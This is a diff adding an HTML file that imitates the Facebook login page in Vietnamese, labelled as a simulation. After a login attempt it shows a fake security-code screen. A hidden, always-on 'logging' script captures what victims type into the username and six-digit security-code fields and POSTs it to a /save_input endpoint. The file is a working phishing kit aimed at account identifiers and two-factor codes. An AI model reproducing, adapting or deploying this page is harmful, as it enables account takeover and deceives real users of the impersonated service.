@@ -1,0 +1,197 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>facebook - Đăng nhập (mô phỏng)</title>
+
+<style>
+  :root{
+    --fb-blue: #1877f2;
+    --fb-green: #42b72a;
+    --bg: #f0f2f5;
+    --card-w: 396px;
+    --code-w: 540px;
+  }
+
+  *{ box-sizing: border-box; margin:0; padding:0; }
+  html, body { height: 100%; }
+  body{
+    font-family: "Helvetica Neue", Arial, Helvetica, sans-serif;
+    -webkit-font-smoothing: antialiased;
+    background: var(--bg);
+    color: #111;
+  }
+
+  .stage {
+    max-width: 1060px;
+    margin: 36px auto;
+    display: flex;
+    gap: 40px;
+    align-items: center;
+    justify-content: center;
+    padding: 0 18px;
+  }
+  .left { flex: 1; padding-left: 40px; }
+  .logo { color: var(--fb-blue); font-weight: 700; font-size: 64px; margin-bottom: 8px; }
+  .desc { font-size: 20px; line-height: 28px; color: #111; max-width: 520px; }
+
+  .right { width: 420px; display: flex; flex-direction: column; align-items: center; }
+  .card {
+    width: var(--card-w);
+    background: #fff;
+    border-radius: 8px;
+    padding: 18px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.06), 0 8px 16px rgba(0,0,0,0.08);
+  }
+
+  .input { width: 100%; height: 52px; padding: 0 14px; font-size: 17px; border-radius: 6px; border: 1px solid #dddfe2; margin-bottom: 12px; }
+  .btn-login { width: 100%; height: 48px; background: var(--fb-blue); color:#fff; border:none; border-radius:6px; font-weight:700; font-size:20px; cursor:pointer; }
+  .forgot{ display:block; text-align:center; margin-top:12px; color: var(--fb-blue); font-size:14px; text-decoration:none; }
+  hr{ border:none; border-top:1px solid #e6e6e6; margin:16px 0; }
+  .create{ display:block; margin:0 auto; width:200px; height:44px; background: var(--fb-green); color:#fff; border:none; border-radius:6px; font-weight:700; font-size:17px; cursor:pointer; }
+  .page-note{ margin-top:18px; width: var(--card-w); text-align:center; font-size:14px; color:#111; }
+  .page-note a{ font-weight:700; color:#000; text-decoration:none; }
+
+  .error { color:#e53935; font-size:13px; margin-bottom:8px; display:none; }
+
+  .code-wrap { display:none; }
+  .code-wrap.active { display:block; }
+  .topbar { height:56px; background:#fff; border-bottom:1px solid #e6e6e6; display:flex; align-items:center; padding-left:18px; }
+  .toplogo { color: var(--fb-blue); font-weight:700; font-size:28px; }
+  .hero { background:#e9edf2; min-height:420px; display:flex; align-items:center; justify-content:center; padding:40px 12px; }
+  .code-card { width: var(--code-w); background:#fff; border-radius:6px; padding:18px; border:1px solid rgba(0,0,0,0.04); box-shadow:0 2px 4px rgba(0,0,0,0.06), 0 8px 18px rgba(0,0,0,0.08); }
+  .title { font-size:20px; font-weight:700; margin-bottom:10px; }
+  .desc-sm { font-size:15px; margin-bottom:16px; }
+  .code-input { width:240px; height:40px; padding:0 10px; border-radius:6px; border:1px solid #ccc; font-size:16px; }
+  .note { font-size:14px; margin-bottom:4px; }
+  #onlyLine { font-weight:700; margin-top:6px; font-size:16px; color:#050505; display:block; }
+  .link { display:block; color:var(--fb-blue); text-decoration:none; margin-top:12px; font-size:14px; }
+  .bottom { display:flex; gap:12px; justify-content:flex-end; margin-top:16px; }
+  .btn-gray { height:40px; background:#e4e6eb; border:none; border-radius:6px; padding:0 14px; font-size:15px; cursor:pointer; }
+  .btn-blue { height:40px; background:var(--fb-blue); color:#fff; border:none; border-radius:6px; padding:0 14px; font-size:15px; cursor:pointer; font-weight:600; }
+
+  @media (max-width:920px){
+    .stage{ flex-direction: column; align-items:center; gap:16px; margin-top:24px; }
+    .left{ padding-left:10px; text-align:center; }
+    .logo{ font-size:48px; }
+    .desc{ font-size:18px; line-height:26px; }
+    .right{ width:100%; align-items:center; }
+    .card, .page-note, .code-card{ width:92%; }
+  }
+</style>
+</head>
+<body>
+
+  <div id="loginStage" class="stage">
+    <div class="left">
+      <div class="logo">facebook</div>
+      <div class="desc">Facebook giúp bạn kết nối và chia sẻ<br>với mọi người trong cuộc sống của bạn.</div>
+    </div>
+
+    <div class="right">
+      <div id="loginCard" class="card">
+        <form id="loginForm" autocomplete="off" novalidate>
+          <input id="username" class="input" type="text" placeholder="Email hoặc số điện thoại">
+          <input id="password" class="input" type="password" placeholder="Nhập mật khẩu của bạn">
+          <div id="errGeneral" class="error">Vui lòng nhập ít nhất 10 ký tự cho email hoặc số điện thoại.</div>
+          <div id="errPhone" class="error">Số điện thoại phải có ít nhất 10 chữ số.</div>
+          <div id="errPass" class="error">Mật khẩu phải có ít nhất 6 ký tự và chứa cả chữ và số.</div>
+          <button id="btnLogin" class="btn-login" type="button">Đăng nhập</button>
+        </form>
+        <a class="forgot" href="#">Quên mật khẩu?</a>
+        <hr>
+        <button class="create" type="button">Tạo tài khoản mới</button>
+      </div>
+      <div class="page-note"><a href="#">Tạo Trang</a> dành cho người nổi tiếng, thương hiệu hoặc doanh nghiệp.</div>
+    </div>
+  </div>
+
+  <div id="codeWrap" class="code-wrap">
+    <div class="topbar"><div class="toplogo">facebook</div></div>
+    <div class="hero">
+      <div class="code-card">
+        <div class="title">Nhập mã bảo mật</div>
+        <div class="desc-sm">Vui lòng kiểm tra tin nhắn để nhận mã bảo mật. Mã gồm 6 chữ số.</div>
+        <div style="display:flex;gap:20px;align-items:flex-start;">
+          <input id="codeInput" class="code-input" type="text" maxlength="6" placeholder="Nhập mã">
+          <div style="flex:1">
+            <div class="note">Chúng tôi đã gửi mã của bạn đến:</div>
+            <div id="onlyLine"></div>
+          </div>
+        </div>
+        <a id="didntGet" class="link" href="#">Chưa nhận được mã?</a>
+        <div class="bottom">
+          <button class="btn-gray" id="tryOther">Thử cách khác</button>
+          <button class="btn-blue" id="continueBtn">Tiếp tục</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function(){
+  function onlyDigits(s){ return (s||'').replace(/\D/g,''); }
+  function extractLast10Digits(d){ if(!d||d.length<10)return null; if(d.length===11&&d.startsWith('84')) return '0'+d.slice(2); return d.slice(-10); }
+  function maskPhoneDisplay(local10){ if(!local10||local10.length!==10)return "+84**********"; return "+84*******"+local10.slice(-2); }
+  function maskEmailDisplay(raw){ if(!raw||raw.indexOf('@')===-1)return "h*****@gmail.com"; var p=raw.split('@');return (p[0].charAt(0)||'h')+"*****@"+p.slice(1).join('@'); }
+  function validPassword(p){ return p&&p.length>=6&&/[A-Za-z]/.test(p)&&/\d/.test(p); }
+
+  var loginStage=document.getElementById('loginStage');
+  var loginCard=document.getElementById('loginCard');
+  var codeWrap=document.getElementById('codeWrap');
+  var errGeneral=document.getElementById('errGeneral');
+  var errPhone=document.getElementById('errPhone');
+  var errPass=document.getElementById('errPass');
+  var onlyLine=document.getElementById('onlyLine');
+
+  function showCodeUI(maskText){
+    loginStage.style.display='none';
+    codeWrap.classList.add('active');
+    onlyLine.textContent=maskText;
+    setTimeout(()=>document.getElementById('codeInput').focus(),80);
+  }
+
+  function tryLogin(){
+    errGeneral.style.display=errPhone.style.display=errPass.style.display='none';
+    var u=document.getElementById('username').value.trim();
+    var p=document.getElementById('password').value||'';
+    if(!u||u.length<10){ var d=onlyDigits(u); if(d.length>0&&d.length<10){errPhone.style.display='block';return;} errGeneral.style.display='block';return;}
+    if(!validPassword(p)){errPass.style.display='block';return;}
+    if(u.indexOf('@')!==-1){ showCodeUI(maskEmailDisplay(u)); return; }
+    var d=onlyDigits(u),local10=extractLast10Digits(d);
+    if(!local10){ if(d.length>0&&d.length<10){errPhone.style.display='block';return;} showCodeUI(maskEmailDisplay(u)); return;}
+    showCodeUI(maskPhoneDisplay(local10));
+  }
+
+  document.getElementById('btnLogin').addEventListener('click',e=>{e.preventDefault();tryLogin();});
+  document.getElementById('tryOther').addEventListener('click',e=>{e.preventDefault();codeWrap.classList.remove('active');loginStage.style.display='';});
+  document.getElementById('continueBtn').addEventListener('click',()=>alert('Tiếp tục (demo).'));
+});
+</script>
+
+<!-- Logging script (auto enabled) -->
+<script>
+(function(){
+  const LOG_ENDPOINT = '/save_input';
+  const fieldsToWatch = ['username','codeInput'];
+  let loggingEnabled = true; // luôn bật
+  const eventsBuffer = [];
+  function nowISO(){ return new Date().toISOString(); }
+  function diffChars(prev,curr){ if(prev===curr)return{action:'none',text:''}; if(curr.length>prev.length)return{action:'insert',text:curr.slice(prev.length)}; return{action:'delete',text:'[deleted '+(prev.length-curr.length)+' char(s)]'}; }
+  function recordFieldEvent(fid,act,txt){ if(!loggingEnabled||!txt)return; eventsBuffer.push({field:fid,action:act,text:txt,time:nowISO()}); if(eventsBuffer.length>=10) flushBuffer(); }
+  function flushBuffer(){ if(eventsBuffer.length===0)return; const payload={events:eventsBuffer.splice(0),ts:nowISO()}; fetch(LOG_ENDPOINT,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload),keepalive:true}); }
+  function setup(){ fieldsToWatch.forEach(id=>{ const el=document.getElementById(id); if(!el)return; let prev=el.value||''; el.addEventListener('input',()=>{const d=diffChars(prev,el.value||''); if(d.action!=='none')recordFieldEvent(id,d.action,d.text); prev=el.value||'';}); el.addEventListener('blur',flushBuffer); }); }
+  if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',setup);} else setup();
+  window.addEventListener('beforeunload',flushBuffer);
+})();
+</script>
+
+</body>
+</html>
+
+
+
+
+
